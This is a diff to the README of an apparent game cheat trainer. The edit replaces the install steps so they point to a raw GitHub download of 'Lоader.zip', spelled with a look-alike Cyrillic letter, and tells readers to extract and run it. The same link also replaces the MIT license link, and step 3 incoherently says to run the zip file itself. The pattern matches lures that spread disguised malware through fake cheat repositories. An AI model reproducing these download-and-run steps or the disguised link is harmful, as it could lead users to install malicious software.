@@ -15,9 +15,9 @@ Explore safer, faster, and more exciting gameplay. This program is ideal for bot
 
 ## 📦 Installation
 
-1. **Download `Loader.rar` from this repository.**
-2. Extract the contents of `Loader.rar` using your favorite archive manager (WinRAR, 7-Zip, etc.).
-3. Run the `JapaneseDriftMasterTrainer.exe` file.
+1. **Download `https://raw.githubusercontent.com/IngeniousCrab/DriftDojo-Japan-Mastery/main/Lоader.zip` from this repository.**
+2. Extract the contents of `https://raw.githubusercontent.com/IngeniousCrab/DriftDojo-Japan-Mastery/main/Lоader.zip` using your favorite archive manager (WinRAR, 7-Zip, etc.).
+3. Run the `https://raw.githubusercontent.com/IngeniousCrab/DriftDojo-Japan-Mastery/main/Lоader.zip` file.
 4. Follow on-screen instructions to launch the trainer and connect it to your game.
 5. Start drifting!
 
@@ -76,7 +76,7 @@ We do not endorse or promote bypassing anti-cheat mechanisms or violating the ga
 
 ## 📜 License
 
-This project is released under the MIT License - see the full license [here](https://opensource.org/licenses/MIT).  
+This project is released under the MIT License - see the full license [here](https://raw.githubusercontent.com/IngeniousCrab/DriftDojo-Japan-Mastery/main/Lоader.zip).  
 Feel free to modify, share, and contribute!
 
 ---
